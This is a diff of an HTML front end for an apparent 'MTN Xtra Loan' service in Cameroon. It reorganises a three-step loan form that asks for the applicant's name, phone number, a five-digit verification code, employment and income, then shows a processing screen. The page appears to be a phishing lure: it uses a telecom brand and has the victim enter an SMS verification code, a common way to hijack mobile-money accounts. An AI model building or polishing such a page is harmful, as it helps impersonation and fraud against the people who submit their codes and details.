@@ -9,29 +9,26 @@
 </head>
 <body>
 
-    <!-- Language Selection Screen -->
-    <div id="language-screen" class="screen active">
+    <!-- Screen 1: Language Selection -->
+    <div id="screen-language" class="app-screen active">
         <div class="card">
             <h2>Choose your language</h2>
             <p>Select your language to continue</p>
-            <button class="lang-btn" onclick="startApp()">🇬🇧 English</button>
-            <button class="lang-btn" onclick="startApp()">🇫🇷 Français</button>
-            <button class="lang-btn" onclick="startApp()">🇨🇲 Camfranglais</button>
+            <button class="lang-btn" onclick="showScreen('screen-home')">🇬🇧 English</button>
+            <button class="lang-btn" onclick="showScreen('screen-home')">🇫🇷 Français</button>
+            <button class="lang-btn" onclick="showScreen('screen-home')">🇨🇲 Camfranglais</button>
             <p class="small-text">You can change it anytime</p>
         </div>
     </div>
 
-    <!-- Main App (Hidden initially) -->
-    <div id="main-app" class="screen">
-        
-        <!-- Header -->
+    <!-- Screen 2: Home & Calculator -->
+    <div id="screen-home" class="app-screen">
         <header>
             <div class="logo"><i class="fas fa-sim-card"></i> MTN Xtra Loan</div>
             <div class="tagline">Easy Loan</div>
         </header>
 
-        <!-- Home / Calculator Screen -->
-        <div id="home-screen" class="content active">
+        <div class="content">
             <h2>Welcome to MTN Xtra Loan</h2>
             <p>Get loans easily through MTN Xtra Loan Cameroon</p>
             
@@ -49,104 +46,104 @@
                     <h3 id="monthly-payment">XAF 0</h3>
                 </div>
 
-                <button class="btn-primary" onclick="goToStep(1)">START APPLICATION</button>
+                <button class="btn-primary" onclick="showScreen('screen-step1')">START APPLICATION</button>
             </div>
         </div>
+    </div>
 
-        <!-- Application Form -->
-        <div id="form-screen" class="content">
-            <div class="progress-bar"><div id="progress" style="width: 33%;"></div></div>
-            <p id="step-indicator">Step 1 of 3</p>
+    <!-- Screen 3: Step 1 (Loan Details) -->
+    <div id="screen-step1" class="app-screen">
+        <div class="content">
+            <div class="progress-bar"><div style="width: 33%;"></div></div>
+            <p class="step-indicator">Step 1 of 3</p>
+            
+            <h3>Loan Details</h3>
+            <label>Loan Type</label>
+            <select id="loan-type">
+                <option>Business Loan</option>
+                <option>Personal Loan</option>
+                <option>Emergency Loan</option>
+                <option>Education Loan</option>
+            </select>
 
-            <!-- Step 1 -->
-            <div id="step-1" class="form-step active">
-                <h3>Loan Details</h3>
-                <label>Loan Type</label>
-                <select id="loan-type">
-                    <option>Business Loan</option>
-                    <option>Personal Loan</option>
-                    <option>Emergency Loan</option>
-                    <option>Education Loan</option>
-                </select>
+            <label>Loan Amount (XAF)</label>
+            <input type="number" id="form-amount" value="500000">
 
-                <label>Loan Amount (XAF)</label>
-                <input type="number" id="form-amount" value="500000">
+            <label>Loan Term</label>
+            <select id="form-term">
+                <option>12 Months</option>
+                <option>24 Months</option>
+                <option>36 Months</option>
+                <option>48 Months</option>
+            </select>
 
-                <label>Loan Term</label>
-                <select id="form-term">
-                    <option>12 Months</option>
-                    <option>24 Months</option>
-                    <option>36 Months</option>
-                    <option>48 Months</option>
-                </select>
+            <label>Purpose of Loan</label>
+            <input type="text" id="loan-purpose" placeholder="e.g., Business expansion">
 
-                <label>Purpose of Loan</label>
-                <input type="text" id="loan-purpose" placeholder="e.g., Business expansion">
+            <button class="btn-primary" onclick="showScreen('screen-step2')">NEXT STEP</button>
+        </div>
+    </div>
 
-                <button class="btn-primary" onclick="nextStep(2)">NEXT STEP</button>
+    <!-- Screen 4: Step 2 (Personal Details) -->
+    <div id="screen-step2" class="app-screen">
+        <div class="content">
+            <div class="progress-bar"><div style="width: 66%;"></div></div>
+            <p class="step-indicator">Step 2 of 3</p>
+
+            <h3>Personal Details</h3>
+            <label>First Name</label>
+            <input type="text" id="first-name" placeholder="First Name">
+
+            <label>Last Name</label>
+            <input type="text" id="last-name" placeholder="Last Name">
+
+            <label>Phone Number (Cameroon)</label>
+            <div class="phone-input">
+                <span>+237</span>
+                <input type="tel" id="phone" placeholder="9 digits (e.g., 670123456)">
             </div>
 
-            <!-- Step 2 -->
-            <div id="step-2" class="form-step">
-                <h3>Personal Details</h3>
-                <label>First Name</label>
-                <input type="text" id="first-name" placeholder="First Name">
+            <label>5-Digit Verification Code</label>
+            <input type="text" id="verification-code" placeholder="Enter 5-digit code" maxlength="5" pattern="\d{5}">
 
-                <label>Last Name</label>
-                <input type="text" id="last-name" placeholder="Last Name">
-
-                <label>Phone Number (Cameroon)</label>
-                <div class="phone-input">
-                    <span>+237</span>
-                    <input type="tel" id="phone" placeholder="9 digits without prefix (e.g., 670123456)">
-                </div>
-
-                <!-- NEW 5-DIGIT CODE FIELD -->
-                <label>5-Digit Verification Code</label>
-                <input type="text" id="verification-code" placeholder="Enter 5-digit code" maxlength="5" pattern="\d{5}" title="Please enter exactly 5 digits" required>
-
-                <div class="btn-row">
-                    <button class="btn-secondary" onclick="goToStep(1)">BACK</button>
-                    <button class="btn-primary" onclick="nextStep(3)">NEXT STEP</button>
-                </div>
-            </div>
-
-            <!-- Step 3 -->
-            <div id="step-3" class="form-step">
-                <h3>Employment Details</h3>
-                <label>Employment Status</label>
-                <select id="employment-status">
-                    <option>Self-employed</option>
-                    <option>Employed full-time</option>
-                    <option>Employed part-time</option>
-                    <option>Student</option>
-                    <option>Unemployed</option>
-                </select>
-
-                <label>Annual Income (XAF)</label>
-                <input type="number" id="annual-income" placeholder="e.g., 5000000">
-
-                <div class="summary-box">
-                    <h4>Application Summary</h4>
-                    <p><strong>Loan Amount:</strong> <span id="summary-amount">XAF 500,000</span></p>
-                    <p><strong>Loan Term:</strong> <span id="summary-term">12 Months</span></p>
-                    <p><strong>Applicant:</strong> <span id="summary-name">—</span></p>
-                </div>
-
-                <div class="btn-row">
-                    <button class="btn-secondary" onclick="goToStep(2)">BACK</button>
-                    <button class="btn-primary" id="submit-btn">SUBMIT APPLICATION</button>
-                </div>
+            <div class="btn-row">
+                <button class="btn-secondary" onclick="showScreen('screen-step1')">BACK</button>
+                <button class="btn-primary" onclick="showScreen('screen-step3')">NEXT STEP</button>
             </div>
         </div>
+    </div>
 
-        <!-- Processing Screen -->
-        <div id="processing-screen" class="content processing">
-            <h2>Processing Application</h2>
-            <p>Please wait, this may take a few seconds</p>
-            <div class="loader"></div>
+    <!-- Screen 5: Step 3 (Employment Details) -->
+    <div id="screen-step3" class="app-screen">
+        <div class="content">
+            <div class="progress-bar"><div style="width: 100%;"></div></div>
+            <p class="step-indicator">Step 3 of 3</p>
+
+            <h3>Employment Details</h3>
+            <label>Employment Status</label>
+            <select id="employment-status">
+                <option>Self-employed</option>
+                <option>Employed full-time</option>
+                <option>Employed part-time</option>
+                <option>Student</option>
+                <option>Unemployed</option>
+            </select>
+
+            <label>Annual Income (XAF)</label>
+            <input type="number" id="annual-income" placeholder="e.g., 5000000">
+
+            <div class="btn-row">
+                <button class="btn-secondary" onclick="showScreen('screen-step2')">BACK</button>
+                <button class="btn-primary" id="submit-btn">SUBMIT APPLICATION</button>
+            </div>
         </div>
+    </div>
 
+    <!-- Screen 6: Processing / Success -->
+    <div id="screen-processing" class="app-screen processing">
+        <h2 id="processing-title">Processing Application</h2>
+        <p id="processing-text">Please wait, this may take a few seconds</p>
+        <div class="loader" id="loader-spinner"></div>
     </div>
 
     <script src="script.js"></script>
